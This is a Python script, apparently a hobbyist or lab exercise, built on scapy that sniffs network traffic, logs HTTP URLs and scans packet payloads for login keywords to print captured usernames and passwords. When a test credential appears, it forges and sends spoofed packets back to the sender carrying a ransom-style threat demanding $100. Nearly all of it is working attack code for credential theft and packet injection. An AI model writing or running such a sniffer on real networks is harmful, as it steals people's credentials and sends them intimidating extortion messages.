import scapy.all as scapy
from scapy import *
from scapy.interfaces import IFACES
from scapy_http import http

def sniff():
    # print("vsvs")
    # scapy.sniff(store=False,
    #             prn=process_sniffed_packet)
    scapy.sniff(store=False,
                prn=n_process)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    # print("xoxo")
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "uname",
                    "user", "login",
                    "password", "pass"]
        for keyword in keywords:
            if keyword.encode() in load:
                return load


def process_sniffed_packet(packet):
    # print("sucess")
    # print(packet.src)
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url.decode("utf-8"))

        login_info = get_login_info(packet)
        if login_info:
            # print("hihi")
            print("\n\n[+] Possible username/password > "
                  + login_info.decode()
                  + "\n\n")
            if (login_info.decode() == "uname=" + "000" + "&" + "pass=" + "123"):
                packet.show()
                
                #print("You're Hacked ! ! ! ! ! !\nYou must transfer $100 to this account < nukcsie >\nOR!!!\n[Warning] : Your computer will crash forever")
                print("in")
               # packet.getlayer(1).hwsrc='5'
                
                nPayload="You're Hacked ! ! ! ! ! !\nYou must transfer $100 to this account < nukcsie >\nOR!!!\n[Warning] : Your computer will crash forever"
                xPayload = nPayload.encode('utf-8')
                nPayload =""
                packet.getlayer(scapy.packet.Raw).load=xPayload
                # print(packet.getlayer(layers.l2.Ethernet).src)
                print(packet.getlayer(scapy.packet.Raw).load)

                buffIpdst = packet.getlayer(scapy.IP).dst
                buffIpsrc = packet.getlayer(scapy.IP).src
                buffEthdst = packet.getlayer(layers.l2.Ether).dst
                buffEthsrc = packet.getlayer(layers.l2.Ether).src

                packet.getlayer(scapy.IP).dst = buffIpsrc.encode('utf-8')
                packet.getlayer(scapy.IP).src = buffIpdst.encode('utf-8')
                packet.getlayer(layers.l2.Ether).dst = buffEthsrc.encode('utf-8')
                packet.getlayer(layers.l2.Ether).src = buffEthdst.encode('utf-8')
                packet.show()   

        
                scapy.send(packet)
                packet.show()
                #print(arp_request_broadcast.payload.layers())
                #rawPayload = (arp_request_broadcast.getlayer(scapy.IP).version)
                #rawPayload = arp_request_broadcast.layers()
                #arp_request_broadcast.getlayer(scapy.packet.Raw).load="stfu3"
                #rawPayload = (arp_request_broadcast.getlayer(scapy.packet.Raw).load)
                #print(rawPayload)

def n_process(packet):
    
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url.decode("utf-8"))

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > "
                  + login_info.decode()
                  + "\n\n")
            if (login_info.decode() == "uname=" + "000" + "&" + "pass=" + "123"):
                print("in")
                nPayload="You're Hacked ! ! ! ! ! !\nYou must transfer $100 to this account < nukcsie >\nOR!!!\n[Warning] : Your computer will crash forever"
                buffIpdst = packet.getlayer(scapy.IP).dst
                buffIpsrc = packet.getlayer(scapy.IP).src
                buffEthdst = packet.getlayer(layers.l2.Ether).dst
                buffEthsrc = packet.getlayer(layers.l2.Ether).src

                nEth = scapy.Ether(buffEthsrc) 
                nIp = scapy.IP(src =buffIpdst ,dst=buffIpsrc,ttl=10)
                nTcp=scapy.TCP(sport=8888,dport=88)
                nPayload="You suck got hacked!!!"
                nPkt=nEth/nIp/nTcp/nPayload
                print(packet.getlayer(scapy.IP).dst)
                nPkt.show()
                scapy.send(nPkt)

sniff()